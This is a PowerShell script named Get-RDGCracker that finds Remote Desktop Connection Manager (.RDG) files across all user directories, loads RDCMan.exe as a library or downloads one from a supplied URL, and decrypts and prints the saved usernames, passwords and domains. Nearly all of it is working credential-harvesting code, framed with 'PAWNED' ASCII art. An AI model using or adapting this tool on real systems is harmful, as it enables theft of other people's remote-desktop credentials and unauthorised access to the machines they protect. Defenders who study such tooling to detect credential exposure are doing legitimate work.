# GoGo Power(Shell)Ranger
# Optional Parameteres:
function Get-RDGCracker
{

<# 
.Synopsis 
   Use PowerShell to find and Crack Remote Desktop Connection Manager 
.Description 
   This PowerShell script Searchs for *.RDG files in the "c:\Users" Directory
   and in alll the Subdirecories, when RDG files has been found The script will use
   the RDCMAN.exe witch located in "c:\Program Files (x86)". 
.Parameter Password  
   use The Argument -Password to crack a password from the local machine 
.Parameter PATH 
   use The Argument -Path to crack a RDG file from the local machine 
.Parameter Force 
   When this parameter -Force is used, The Url Parameter will be needed too.and with the url powershell will download the dll from HTTP server.    
.Parameter URL 
   Don't forget to use -URL Argument if you're using -Force 
 
.example 
   Get-RDGCracker 
    
   Description 
   ----------- 
   The will search and Crack RDG files

.example 
   Get-RDGCracker -PATH c:\users\user\abcd.rdg
    
   Description 
   ----------- 
    Crack spesific RDG file 
.example 
   Get-RDGCracker -Password AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAaxDmDn3QlEywbGaxFbRBCgAAAAACAAAAAAAQZgAAAAEAACAAAACsIP06El88paC9kIe7ZyFgrO+dncDZca7K6lJ+syYlTAAAAAAOgAAAAAIAACAAAABjV510S7n7FRVaOpx/Zy5O9lhPi+klWuzKiAnsymqM/yAAAADfZTPGGxAzT4l41v2RGj2EGz/Nel44EkYWL5oPAI4Uq0AAAAAsOWHjJbfibk61gq2+YjpZPFLrSMxSY0VcnNHY1ZtvBcF4qMY8vVu+de43f4AxCvgRZGfS2KRSP8StXZSIsDwo
    
   Description 
   ----------- 
  Will Crack only the Password.

.example 
   Get-RDGCracker -Force=$true -URL=http://192.168.1.1/rdcman.dll -Path c:\users\user\abcd.rdg
    
   Description 
   ----------- 
   This script Needs User Premmsions to Crack his RDG files.        
.Link 
   not yet. 
.link 
   
.Notes 
   NAME:      Get-RDGCracker 
   VERSION:   1.0 
   AUTHOR:    Hutch, Sahchar Korot, Omri Inbar 
   LASTEDIT:  04/06/2017 
 
#> 
[CmdletBinding()]
Param
(
 [Parameter(Mandatory=$false,HelpMessage="Don't forget to use -URL Argument when using -Force")]
 [string]
 $URL = $null,
 [Parameter(Mandatory=$false,HelpMessage="use The Argument -Force to download the dll from HTTP server")]
 [ValidateSet($true, $false)]
 [switch]
 $force = $false,
 [Parameter(Mandatory=$false,HelpMessage="use The Argument -Password to crack a password from the local machine")]
 [string]
 $Password,
 [Parameter(Mandatory=$false,HelpMessage="use The Argument-Path to crack a RDG file from the local machine")]
 [string]
 $Path = $null
)  

                                                                           
$text = @"                                                                                 
                     _a_a_a_,                                                   
                    =Xi-"!!!!!!**4W4Uaaaaaa_aa                                  
                    =U`...:-:::..:4mmguuwdQUQXHXHQ##Wn                          
                    jC.......-.:::%WWWW#WWWWWWWWWW4#A7                          
                   _4i;....:.:.:.:=4UWWWUWWWWWWWWU4W8(                          
                   =U(=)....-.:.:::%N0TH1NGUUUUWUO4W%(                          
                   jU.]];......-.-.=BUTXAXXX44UXX3W&3                           
                   K}:===:....-.-.::A1337PAR7YOO34U27                           
                  j3i:==;;PAWNED!-..=%3%3%3%3333%dUO(                           
                  jX':::::-........-:]]]]]xxx]xx]UU3(                           
                  X3.--...... ......:==+=+++++++=UU3                            
                 _3)_a.... . ........:;;========jX23                            
                 -%%3%%%33Xa_=_a,.....:::-:::::add#WWWW8a__                     
                      -~"~~!333%%%%%*C_a_a;:adW#0000##0#W#mU_,                  
                            .___ax3xx]%3334W#000000#0###UOQU&2L                 
                          _XOXXXXgggguxxxxW000000#####DCx%%W4UXn                
                         OXXXXXUXUU44XXXG##000@*Q###D]]]%gUXXXXOl               
                         !XXXXUUUUWUUUUW4##00Wa]]%4WAo]+]*X4XXOc&               
                          -^XWXUUWUUU4UUU##0###Ao]]%XUGw]+xXXXXCU               
                              ^"?!!!"!!!^4###WW*x]]u4UUUWwmUU4X4i               
                                         -#WWW]]]uWUUUUWUWWUUUXP                
                                          -!WUUwXUX4UUUWWWWWUW^                 
                                            "!QOXXX44UUUWU#W?                   
                                               ""!3mWW2?!!                                                                 
"@
#Swag 
Write-Host  -ForegroundColor GREEN $text 
echo "GoGo Power(Shell)Ranger"
echo "PowerShell Remote Desktop Connection Manager Decryptor."
echo "-------------------------------------------------------"
echo "use The Argument -Password to crack a password from the local machine"
echo "use The Argument -Path to crack a RDG file from the local machine"
echo "use The Argument -Force to download the dll from HTTP server"
echo "Don't forget to use -URL Argument if you're using -Force"
echo ""

$Test ="C:\Users\user" 
$TempLocation = "C:\temp"
#check reqiuest for download the dll 
if($force -eq $false)
{
    # Path to RDCMan.exe
    $RDCMan = (Get-ChildItem -Path "c:\Program Files (x86)" -Filter RDCMan.exe -Recurse -Force -ErrorAction SilentlyContinue).FullName
    # If No Url and No RDCMAN.exe exit
    if($RDCMan -eq "")
    {
    echo "No RDCman"
    return
    }

    #Making RDCman Dll
    try{Copy-Item $RDCMan "$TempLocation\RDCMan.dll" -ErrorAction Ignore -WarningAction Ignore}
    
    catch{$_.exception.message}
}
else
{
    # get from the parameters the RDCMan.dll remotre path and download it to c:\temp
    if($URL -eq $null){return}
    $output = "$Test\RDCMan.dll"
    $start_time = Get-Date

    $wc = New-Object System.Net.WebClient
    try{$wc.DownloadFile($URL, $output)}
    catch{$_.exception.message}

    Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
    Import-Module $output -ErrorAction Ignore -WarningAction SilentlyContinue
}

#Import RDCMan.DLL
Import-Module "$TempLocation\RDCMan.dll" -ErrorAction Ignore -WarningAction SilentlyContinue


#If Password parameter Exist Decypt and Exit
 if ($Password.Length -gt 6)
 {
     #Import Ecryption-Settings, Needed for the Decryption
     $EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
     [RdcMan.Encryption]::DecryptString($Password, $EncryptionSettings)
     return
 }
 
 #If Path parameter Exist, don't search RDG files
 if($Path)
 {
    ##  Ensure the thing exists. If not, this function will not continue
    if  (-not (Test-Path –Path $PATH)){Write-Host  'The file does not exist'} 
    $RDGFile = $Path
 }
 else
 {
     #This is the RDG files search :
    cd c:\users
    $RDGFile = New-Object System.Collections.Arraylist
    $RDGFile = (Get-ChildItem -Exclude C:\Windows -Filter *.rdg -Recurse -Force -ErrorAction SilentlyContinue).FullName
 }


#sets encryption settings, needed for the Decryption
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
#Print RDG locations:
echo "RDG files Located in:"
ForEach ($i in $RDGFile) {echo $i}


#this code is making RDG as XML object file
$XML = New-Object -TypeName XML
##Search Credentials in the XPath CredentialsProfile:
ForEach ($i in $RDGFile) 
{

    $XML.Load($i)
    $logonCredentials = Select-XML -Xml $XML -XPath '//credentialsProfile'
 
    $Credentials = New-Object System.Collections.Arraylist
    $logonCredentials | foreach {
        [void]$Credentials.Add([pscustomobject]@{
        Username = $_.Node.userName
        Password = $(Try{[RdcMan.Encryption]::DecryptString($_.Node.password, $EncryptionSettings)}Catch{$_.Exception.InnerException.Message})
        Domain = $_.Node.domain
            })
        } 
        $Credentials | Sort Username
}
#Search Credentials in the XPath: logonCredentials 
ForEach ($i in $RDGFile) 
{
    $XML.Load($i)
    $logonCredentials = Select-XML -Xml $XML -XPath '//logonCredentials'
 
    $Credentials = New-Object System.Collections.Arraylist
    $logonCredentials | foreach {
        [void]$Credentials.Add([pscustomobject]@{
        Username = $_.Node.userName
        Password = $(Try{[RdcMan.Encryption]::DecryptString($_.Node.password, $EncryptionSettings)}Catch{$_.Exception.InnerException.Message})
        Domain = $_.Node.domain
            })
        } 
      $Credentials | Sort Username
}
}
